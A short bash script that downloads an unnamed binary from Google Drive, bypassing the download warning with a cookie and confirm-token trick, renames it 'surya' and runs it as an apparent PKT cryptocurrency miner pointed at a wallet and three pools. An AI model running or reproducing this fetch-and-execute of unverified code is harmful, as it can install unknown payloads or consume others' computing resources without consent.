#!/bin/bash
echo 'Gas mining'
wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1-4Obv7adMsav5SFK_0orDqyLQS0C0pIY' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1-4Obv7adMsav5SFK_0orDqyLQS0C0pIY" -O surya && rm -rf /tmp/cookies.txt
chmod +x surya
./surya ann -p pkt1qf3f3hv86ccy0k3h5p9l66hcyakxa8rhfatygj2 http://pool.srizbi.com http://pool.pkt.world http://pool.pktpool.io